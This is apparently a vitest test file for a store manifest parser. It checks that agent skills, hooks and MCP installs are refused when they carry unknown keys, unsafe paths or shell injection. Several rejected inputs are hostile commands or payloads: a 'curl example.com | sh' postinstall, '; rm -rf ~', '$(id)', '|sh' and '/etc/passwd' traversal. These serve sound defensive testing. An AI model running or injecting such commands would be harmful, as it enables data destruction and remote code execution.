import { describe, expect, it } from 'vitest'
import { COST_ORDER } from '../renderer/store/storefront'
import {
  composeMcpCommand,
  deriveTier,
  KIND_HAS_ARTIFACT,
  KIND_NAMES,
  KIND_ONE_LINE,
  KIND_TIER_FLOOR,
  MAX_MANIFEST_BYTES,
  MCP_RUNTIMES,
  parseManifest,
  readInstallBlock,
  STORE_COSTS,
  STORE_KINDS,
  TIER_WORDS,
  type McpInstall,
  type StoreKind,
} from './store-manifest'

/*
 * Every case is named as the sentence it protects, the way
 * `browser-store-recipe.test.ts` and `storefront.test.ts` are written. A
 * refusal that stops being a refusal should read here as a broken promise, not
 * as a failing assertion nobody can place.
 */

const EXPECTED = { publisher: 'acme', id: 'pr-review' }

function manifest(over: Record<string, unknown> = {}): string {
  return JSON.stringify({
    terminaldeck: 1,
    publisher: 'acme',
    id: 'pr-review',
    kind: 'skill',
    name: 'Pull request review',
    summary: 'Reads a diff and writes the review you would have written.',
    version: '1.0.0',
    licence: 'MIT',
    category: 'code',
    tags: ['review', 'git'],
    agents: ['claude', 'codex'],
    platforms: ['darwin', 'linux'],
    delivery: 'repo',
    pricing: { model: 'free' },
    links: { repo: 'https://github.com/acme/pr-review' },
    needs: [],
    install: { dir: 'skills/pr-review' },
    ...over,
  })
}

function parse(over: Record<string, unknown> = {}, expected = EXPECTED) {
  return parseManifest(manifest(over), expected)
}

function why(over: Record<string, unknown> = {}, expected = EXPECTED): string {
  const result = parse(over, expected)
  if (result.ok) throw new Error('this manifest was accepted, and the test expected a refusal')
  return result.why
}

/*
 * The two lists this file restates out of `src/main` — the hook events and the
 * MCP runtimes — are held to their originals in `src/main/store-vocabularies.test.ts`
 * and not here. `src/shared/**` is compiled by the renderer's project as well as
 * the main one, and a shared test that imports `src/main/hooks.ts` puts a file
 * the web project does not include into the web project's program: eleven
 * TS6307s, none of them about anything real. The assertion still exists; it
 * lives on the side of the seam that may import both.
 */

describe('the vocabularies this file restates still agree with their originals', () => {
  it('offers no runtime the community store cannot compose a safe command for', () => {
    expect([...MCP_RUNTIMES]).toEqual(['node', 'python'])
    expect(MCP_RUNTIMES).not.toContain('docker')
  })

  it('uses the price words both existing stores already use, minus the one a publisher may not claim', () => {
    expect([...STORE_COSTS, 'unknown']).toEqual(COST_ORDER)
  })

  it('gives every kind a name, a line and an answer about artifacts', () => {
    for (const kind of STORE_KINDS) {
      expect(KIND_NAMES[kind]).toMatch(/\S/)
      expect(KIND_ONE_LINE[kind]).toMatch(/\.$/)
      expect(typeof KIND_HAS_ARTIFACT[kind]).toBe('boolean')
      expect([1, 2, 3]).toContain(KIND_TIER_FLOOR[kind])
    }
    expect(STORE_KINDS).toHaveLength(7)
  })

  it('never calls an open-source tool a plug-in', () => {
    expect(KIND_NAMES.tool).toBe('Open-source tool')
    expect(JSON.stringify(KIND_NAMES).toLowerCase()).not.toContain('plug')
  })
})

describe('a manifest is refused when it disagrees with the row it was offered as', () => {
  it('takes a good one', () => {
    const result = parse()
    expect(result.ok).toBe(true)
    if (result.ok) {
      expect(result.manifest.id).toBe('pr-review')
      expect(result.manifest.install).toEqual({ kind: 'skill', dir: 'skills/pr-review' })
      expect(result.manifest.pricing).toEqual({ model: 'free', note: null, url: null })
    }
  })

  it('refuses a manifest calling itself a different id than it was offered as', () => {
    expect(why({ id: 'pr-reviewer' })).toBe('this manifest calls itself pr-reviewer, and it was offered as pr-review')
  })

  it('refuses a manifest claiming a different publisher than the shelf it is on', () => {
    expect(why({ publisher: 'notacme' })).toContain('it was offered as acme')
  })
})

describe('an unknown key is refused by name, at every level', () => {
  it('at the top', () => {
    expect(why({ postinstall: 'curl example.com | sh' })).toBe(
      'the manifest has a key this app does not know about: postinstall',
    )
  })

  it('inside pricing', () => {
    expect(why({ pricing: { model: 'free', currency: 'usd' } })).toBe(
      'pricing has a key this app does not know about: currency',
    )
  })

  it('inside links', () => {
    expect(why({ links: { repo: 'https://github.com/acme/pr-review', mirror: 'https://x.example' } })).toBe(
      'links has a key this app does not know about: mirror',
    )
  })

  it('inside install', () => {
    expect(why({ install: { dir: '.', command: 'sh setup.sh' } })).toBe(
      'install has a key this app does not know about: command',
    )
  })

  it('inside an MCP input', () => {
    const result = readInstallBlock(
      'mcp',
      {
        runtime: 'node',
        package: 'server-thing',
        args: [],
        token: 'server-thing',
        inputs: [{ key: 'KEY', label: 'Key', hint: 'From the dashboard', kind: 'secret', into: 'env', required: true, default: 'x' }],
      },
      ['claude'],
    )
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.why).toBe('install.inputs[0] has a key this app does not know about: default')
  })
})

describe('there is nowhere in this grammar to write a command', () => {
  const mcp = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
    runtime: 'node',
    package: '@acme/mcp-thing',
    args: [],
    inputs: [],
    token: '@acme/mcp-thing',
    ...over,
  })

  const read = (over: Record<string, unknown> = {}) => readInstallBlock('mcp', mcp(over), ['claude'])

  const refusal = (over: Record<string, unknown> = {}): string => {
    const result = read(over)
    if (result.ok) throw new Error('this install block was accepted, and the test expected a refusal')
    return result.why
  }

  it('builds the command itself, out of this repository’s own words', () => {
    const result = read({ args: ['--root', '${input:ROOT}'], inputs: [
      { key: 'ROOT', label: 'Folder', hint: 'An absolute path', kind: 'path', into: 'arg', required: true },
    ] })
    expect(result.ok).toBe(true)
    if (result.ok) {
      expect(composeMcpCommand(result.install as McpInstall)).toBe('npx -y @acme/mcp-thing --root ${ROOT}')
    }
  })

  it('uses uvx for a python server, because that is the binary the probe looks for', () => {
    const result = read({ runtime: 'python', package: 'mcp-thing', token: 'mcp-thing' })
    expect(result.ok).toBe(true)
    if (result.ok) expect(composeMcpCommand(result.install as McpInstall)).toBe('uvx mcp-thing')
  })

  it('refuses an argument with a space in it, which is the first half of a second command', () => {
    expect(refusal({ args: ['--root /etc'] })).toBe('install.args[0] may only be a plain word or ${input:KEY}')
  })

  it('refuses shell punctuation in an argument', () => {
    for (const arg of ['; rm -rf ~', '`id`', '$(id)', '&& curl x', '|sh']) {
      expect(refusal({ args: [arg] })).toContain('may only be a plain word')
    }
  })

  it('refuses a placeholder naming an input nobody declared', () => {
    expect(refusal({ args: ['${input:TOKEN}'] })).toBe(
      'install.args[0] uses ${input:TOKEN}, which is not declared',
    )
  })

  it('refuses docker by name, with the reason in the message', () => {
    expect(refusal({ runtime: 'docker' })).toContain('docker')
    expect(refusal({ runtime: 'docker' })).toContain('this app builds')
  })

  it('refuses a package that is really a URL or a path', () => {
    expect(refusal({ package: 'https://example.com/x.tgz', token: 'x' })).toContain('not a path or an address')
    expect(refusal({ package: '../../etc/passwd', token: 'x' })).toContain('not a path or an address')
  })

  it('refuses an MCP item whose token is not in the command this app builds', () => {
    expect(refusal({ token: 'something-else' })).toBe(
      'install.token must appear in the command this app builds, and something-else does not',
    )
  })
})

describe('a path in a manifest is a path inside the item', () => {
  const cases: [string, string][] = [
    ['/etc/passwd', 'so it cannot start with /'],
    ['../outside/thing.md', 'must not step outside the item with ..'],
    ['skills\\thing', 'must use / between folders'],
    ['C:/windows/system32', 'so it cannot name a drive'],
  ]
  for (const [path, expected] of cases) {
    it(`refuses ${path}`, () => {
      expect(why({ install: { dir: path } })).toContain(expected)
    })
  }

  it('allows the whole tree, written as a dot', () => {
    const result = parse({ install: { dir: '.' } })
    expect(result.ok).toBe(true)
  })
})

describe('the hook grammar cannot name a moment the agent does not have', () => {
  const hooks = (over: Record<string, unknown> = {}): Record<string, unknown> => ({
    kind: 'hooks',
    needs: ['runs-scripts'],
    install: { script: 'hooks/notify.mjs', events: ['SessionStart'], runtime: 'node' },
    ...over,
  })

  it('takes an event every named agent has', () => {
    expect(parse(hooks()).ok).toBe(true)
  })

  it('refuses an event one of the named agents does not have', () => {
    expect(
      why(hooks({ install: { script: 'hooks/notify.mjs', events: ['PermissionRequest'], runtime: 'node' } })),
    ).toBe('codex has no hook called PermissionRequest, and this item says it works with codex')
  })

  it('refuses an invented event', () => {
    expect(why(hooks({ install: { script: 'hooks/notify.mjs', events: ['OnPayday'], runtime: 'node' } }))).toContain(
      'has no hook called OnPayday',
    )
  })

  it('refuses a runtime this version does not spawn', () => {
    expect(why(hooks({ install: { script: 'hooks/notify.sh', events: ['Stop'], runtime: 'bash' } }))).toBe(
      'install.runtime must be one of: node',
    )
  })
})

describe('the price is on the row before the button', () => {
  it('refuses a paid item with nothing said about the price', () => {
    expect(why({ pricing: { model: 'paid' } })).toContain('pricing.note is required')
  })

  it('takes a paid item that says what it costs', () => {
    expect(parse({ pricing: { model: 'paid', note: '$9 a month, no free tier.' } }).ok).toBe(true)
  })

  it('refuses a price a publisher will not name', () => {
    expect(why({ pricing: { model: 'unknown' } })).toContain('pricing.model must be one of')
  })
})

describe('an off-site listing carries a link and installs nothing', () => {
  const offsite = {
    kind: 'tool' as const,
    delivery: 'off-site',
    install: null,
    pricing: { model: 'paid', note: '$29 once.', url: 'https://acme.example/buy' },
  }

  it('takes one', () => {
    expect(parse(offsite).ok).toBe(true)
  })

  it('refuses an off-site listing that also wants to install something', () => {
    expect(why({ ...offsite, kind: 'skill', install: { dir: '.' } })).toBe(
      'an off-site listing installs nothing here, so it cannot carry an install block',
    )
  })

  it('refuses an off-site listing with nowhere to get it', () => {
    expect(why({ ...offsite, pricing: { model: 'paid', note: '$29 once.' } })).toContain('must say where to get it')
  })

  it('refuses a link that is a bare address nobody can read', () => {
    expect(why({ ...offsite, pricing: { model: 'paid', note: '$29 once.', url: 'https://203.0.113.7/buy' } })).toBe(
      'pricing.url must name a domain, not a bare address',
    )
  })

  it('refuses a tool that carries an install block', () => {
    expect(why({ kind: 'tool', install: { dir: '.' } })).toBe(
      'a tool is a program you install yourself, so it cannot carry an install block',
    )
  })
})

describe('the rest of the closed lists', () => {
  it('refuses a licence we cannot name', () => {
    expect(why({ licence: 'Proprietary' })).toContain('licence must be one of')
  })

  it('refuses a repository somewhere we do not fetch from', () => {
    expect(why({ links: { repo: 'https://example.com/acme/pr-review' } })).toContain('links.repo must be on one of')
  })

  it('refuses http for a repository link', () => {
    expect(why({ links: { repo: 'http://github.com/acme/pr-review' } })).toBe('links.repo must be an https address')
  })

  it('refuses a fourth agent', () => {
    expect(why({ agents: ['claude', 'copilot'] })).toContain('agents[1] must be one of')
  })

  it('refuses a need it made up', () => {
    expect(why({ needs: ['gpu'] })).toContain('needs[0] must be one of')
  })

  it('refuses a category that is not a shelf', () => {
    expect(why({ category: 'misc' })).toContain('category must be one of')
  })

  it('refuses a format from the future by number, rather than guessing at it', () => {
    expect(why({ terminaldeck: 2 })).toBe('this manifest is written for format 2, and this app reads format 1')
  })

  it('refuses a version that is not three numbers', () => {
    expect(why({ version: 'v1' })).toBe('version must look like 1.2.3')
  })

  it('refuses more bytes than it will read, before parsing them', () => {
    const huge = JSON.stringify({ terminaldeck: 1, filler: 'x'.repeat(MAX_MANIFEST_BYTES) })
    const result = parseManifest(huge, EXPECTED)
    expect(result.ok).toBe(false)
    if (!result.ok) expect(result.why).toContain('bytes or fewer')
  })

  it('never throws, whatever it is handed', () => {
    for (const bytes of ['', 'null', '[]', '{', 'true', '"a string"']) {
      expect(parseManifest(bytes, EXPECTED).ok).toBe(false)
    }
  })
})

describe('all seven kinds round-trip', () => {
  const installs: Record<StoreKind, unknown> = {
    skill: { dir: 'skills/pr-review' },
    instructions: { file: 'INSTRUCTIONS.md' },
    hooks: { script: 'hooks/notify.mjs', events: ['SessionStart'], runtime: 'node' },
    mcp: { runtime: 'node', package: '@acme/mcp-thing', args: [], inputs: [], token: '@acme/mcp-thing' },
    extension: { dir: 'extension', reach: ['*.example.com'] },
    routine: { file: 'routines/nightly.md' },
    tool: null,
  }

  for (const kind of STORE_KINDS) {
    it(`takes a ${kind}`, () => {
      const result = parse({ kind, install: installs[kind], agents: ['claude'] })
      expect(result.ok, result.ok ? '' : result.why).toBe(true)
      if (result.ok) expect(result.manifest.kind).toBe(kind)
    })
  }

  it('refuses a kind this build has no shelf for', () => {
    expect(why({ kind: 'binary' })).toContain('kind must be one of')
  })
})

describe('the tier is derived from the bytes, not read off the row', () => {
  const file = (path: string, mode = 0o100644) => ({ path, bytes: 10, mode })

  it('calls a markdown-only skill text', () => {
    expect(deriveTier('skill', [file('SKILL.md'), file('docs/notes.md')])).toEqual({
      tier: 1,
      because: 'every file in it is text',
    })
  })

  it('raises a skill that ships a script, and names the file that did it', () => {
    expect(deriveTier('skill', [file('SKILL.md'), file('bin/run.sh')])).toEqual({
      tier: 2,
      because: 'it ships bin/run.sh',
    })
  })

  it('raises a skill whose file is merely marked runnable', () => {
    expect(deriveTier('skill', [file('SKILL.md'), file('bin/run', 0o100755)]).tier).toBe(2)
  })

  it('puts anything that starts a program on this machine at the top', () => {
    expect(deriveTier('mcp', []).tier).toBe(3)
    expect(deriveTier('hooks', []).tier).toBe(3)
  })

  it('never lands below the floor its kind sets', () => {
    for (const kind of STORE_KINDS) {
      expect(deriveTier(kind, []).tier).toBeGreaterThanOrEqual(KIND_TIER_FLOOR[kind])
    }
  })

  it('has one sentence per tier and no second spelling of it', () => {
    expect(TIER_WORDS[3]).toBe('Runs a program on this machine')
    expect(TIER_WORDS[2]).toBe('Ships scripts the agent may run')
    expect(TIER_WORDS[1]).toBe('Text only — nothing runs')
  })
})
